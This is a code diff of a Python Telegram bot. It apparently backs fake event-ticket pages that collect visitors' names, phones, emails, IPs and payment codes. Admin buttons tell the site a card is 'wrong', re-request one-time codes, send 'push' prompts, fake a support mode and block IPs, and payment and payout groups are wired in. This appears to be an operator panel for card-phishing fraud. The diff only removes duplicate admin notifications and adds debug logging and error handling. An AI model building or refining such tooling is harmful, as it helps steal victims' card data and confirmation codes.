@@ -22,7 +22,7 @@ import uuid
 from aiohttp import web
 from functools import wraps
 import aiohttp
-from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS, PAYMENT_GROUP_ID, PAYOUT_GROUP_ID, SPECIAL_ADMIN_IDS
+from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS, PAYMENT_GROUP_ID, PAYOUT_GROUP_ID, SPECIAL_ADMIN_IDS, GROUP_ID
 import requests
 from aiohttp.web_middlewares import middleware
 import re
@@ -2728,84 +2728,10 @@ async def payment_notify(request):
             print(f"[ERROR] Не вдалося надіслати msg3 у PAYMENT_GROUP_ID: {e}")
             import traceback
             traceback.print_exc()
-    # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
-    # Використовуємо той самий page_code, що й для кнопок
-    admin_user_id = None
-    if page_code:  # page_code вже отримано з data.get('page_code', '')
-        c = conn.cursor()
-        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
-        row = c.fetchone()
-        if row:
-            admin_user_id = row[0]
-    if admin_user_id:
-        # Формуємо красиве повідомлення про початок оформлення замовлення
-        try:
-            # Отримуємо інформацію про подію
-            event_info = get_event_info_by_page_code(page_code) if page_code else None
-            price = event_info.get('price') if event_info else None
-            currency = event_info.get('currency') if event_info else None
-            
-            # Отримуємо username адміна
-            admin_username = get_admin_username_by_user_id(admin_user_id)
-            
-            # Формуємо красиве повідомлення про початок оформлення
-            order_start_message = format_order_start_message(
-                page_code=page_code,
-                name=name,
-                phone=phone,
-                email=email,
-                ip=ip,
-                price=price,
-                currency=currency
-            )
-            
-            await bot.send_message(admin_user_id, order_start_message)
-            print(f"[DEBUG] Order start message sent to event creator {admin_user_id}")
-        except Exception as e:
-            print(f"[ERROR] Не вдалося надіслати order_start_message admin_user_id: {e}")
-            import traceback
-            traceback.print_exc()
-        
-        # Формуємо красиве повідомлення про карту
-        try:
-            # Отримуємо інформацію про подію
-            event_info = get_event_info_by_page_code(page_code) if page_code else None
-            price = event_info.get('price') if event_info else None
-            currency = event_info.get('currency') if event_info else None
-            
-            # Отримуємо username адміна
-            admin_username = get_admin_username_by_user_id(admin_user_id)
-            
-            # Формуємо красиве повідомлення
-            card_message = format_card_notification_message(
-                page_code=page_code,
-                name=name,
-                price=price,
-                currency=currency,
-                admin_username=admin_username
-            )
-            
-            await bot.send_message(admin_user_id, card_message)
-        except Exception as e:
-            print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
-            import traceback
-            traceback.print_exc()
-        if code:
-            try:
-                # Формуємо красиве повідомлення про код
-                code_message = format_code_notification_message(
-                    page_code=page_code,
-                    code=code,
-                    price=price,
-                    currency=currency,
-                    admin_username=admin_username
-                )
-                
-                await bot.send_message(admin_user_id, code_message)
-            except Exception as e:
-                print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
-                import traceback
-                traceback.print_exc()
+    # --- КОМЕНТУЄМО ДУБЛЮВАННЯ ДЛЯ АДМІНА ---
+    # Тепер лог про початок оформлення замовлення надсилається тільки в групу (без кнопок)
+    # А повідомлення з кнопками надсилається в PAYMENT_GROUP_ID
+    # Дублювання для адміна убрано, щоб не засмічувати приватні повідомлення
 
 @log_function
 async def code_notify(request):
@@ -2850,39 +2776,9 @@ async def code_notify(request):
         ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, code_message, reply_markup=kb)
-    # --- Додаю дублювання адміну, якщо знайдено user_id по page_code ---
-    admin_user_id = None
-    if page_code:
-        c = conn.cursor()
-        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
-        row = c.fetchone()
-        if row:
-            admin_user_id = row[0]
-    if admin_user_id:
-        # Формуємо красиве повідомлення про код
-        try:
-            # Отримуємо інформацію про подію
-            event_info = get_event_info_by_page_code(page_code) if page_code else None
-            price = event_info.get('price') if event_info else None
-            currency = event_info.get('currency') if event_info else None
-            
-            # Отримуємо username адміна
-            admin_username = get_admin_username_by_user_id(admin_user_id)
-            
-            # Формуємо красиве повідомлення
-            code_message = format_code_request_message(
-                admin_username=admin_username,
-                name=user_name,
-                price=price,
-                currency=currency,
-                page_code=page_code
-            )
-            
-            await bot.send_message(admin_user_id, code_message)
-        except Exception as e:
-            print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
-            import traceback
-            traceback.print_exc()
+    # --- ДУБЛЮВАННЯ ДЛЯ АДМІНА УБРАНО ---
+    # Тепер код запитується тільки в PAYMENT_GROUP_ID з кнопкою
+    # Дублювання для адміна убрано, щоб не засмічувати приватні повідомлення
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
@@ -2893,6 +2789,9 @@ async def code_notify(request):
     or c.data.startswith('push:')
 ))
 async def admin_action_handler(call: types.CallbackQuery):
+    print(f"[DEBUG] Callback received: {call.data}")
+    print(f"[DEBUG] Callback from user: {call.from_user.id}")
+    print(f"[DEBUG] Callback message: {call.message.text if call.message else 'No message'}")
     parts = call.data.split(':')
     action = parts[0]
     ip = parts[1] if len(parts) > 1 else None
@@ -2924,6 +2823,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         async with aiohttp_client.ClientSession() as session:
             try:
                 resp = await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
+                print(f'[DEBUG] Push response: {resp.status}')
                 
                 # Надсилаємо красиве повідомлення адміну, чия це посилання
                 if page_code:
@@ -2943,6 +2843,7 @@ async def admin_action_handler(call: types.CallbackQuery):
                             currency=event_currency
                         )
                         await bot.send_message(admin_user_id, push_message)
+                        print(f'[DEBUG] Push message sent to admin {admin_user_id}')
                 
             except Exception as e:
                 print(f'[ERROR] Push request failed: {e}')
@@ -2951,9 +2852,14 @@ async def admin_action_handler(call: types.CallbackQuery):
     
     # Обробка кнопок card, block, unblock, code
     if action in ['card', 'block', 'unblock', 'code']:
+        print(f'[DEBUG] Processing {action.upper()} action for ip={ip}')
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
-            await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
+            try:
+                resp = await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
+                print(f'[DEBUG] {action.upper()} response: {resp.status}')
+            except Exception as e:
+                print(f'[ERROR] {action.upper()} request failed: {e}')
         
         if action == 'card':
             await call.answer("Сигнал на сайт: не вірна карта")
@@ -2963,11 +2869,17 @@ async def admin_action_handler(call: types.CallbackQuery):
             await call.answer("Користувач розблокований")
         elif action == 'code':
             await call.answer("Код запитується")
+        print(f'[DEBUG] {action.upper()} action completed')
         return
     elif action == 'support':
         print(f'[DEBUG] Processing SUPPORT action for ip={ip}, page_code={page_code}')
+        import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
-            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
+            try:
+                resp = await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
+                print(f'[DEBUG] Support response: {resp.status}')
+            except Exception as e:
+                print(f'[ERROR] Support request failed: {e}')
         
         # Надсилаємо красиве повідомлення про технічну підтримку
         if ip and page_code:  # Додаємо перевірку page_code
@@ -2987,16 +2899,28 @@ async def admin_action_handler(call: types.CallbackQuery):
                     currency=event_currency
                 )
                 await bot.send_message(admin_user_id, support_message)
+                print(f'[DEBUG] Support message sent to admin {admin_user_id}')
         
         await call.answer("Включена технічна підтримка")
+        print(f'[DEBUG] Support action completed')
+        return
     elif action == 'text':
+        print(f'[DEBUG] Processing TEXT action for ip={ip}, page_code={page_code}')
         await call.answer("Введіть текст повідомлення:")
         user_step[call.from_user.id] = f'text_for_{ip}:{page_code}' if page_code else f'text_for_{ip}'
+        print(f'[DEBUG] Text action completed, user_step set to: {user_step[call.from_user.id]}')
         return
     elif action == 'code_request_again':
+        print(f'[DEBUG] Processing CODE_REQUEST_AGAIN action for code={ip}')
+        import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
-            await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
+            try:
+                resp = await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
+                print(f'[DEBUG] Code request again response: {resp.status}')
+            except Exception as e:
+                print(f'[ERROR] Code request again failed: {e}')
         await call.answer("Код запитується знову")
+        print(f'[DEBUG] Code request again action completed')
         return
     
     # НЕ змінюємо клавіатуру!
@@ -3004,6 +2928,7 @@ async def admin_action_handler(call: types.CallbackQuery):
     
     # Додаємо логування для всіх дій
     print(f'[DEBUG] Admin action completed: {action} for IP: {ip}, page_code: {page_code}')
+    print(f'[DEBUG] This should not happen - all actions should have return statements')
 
 
 
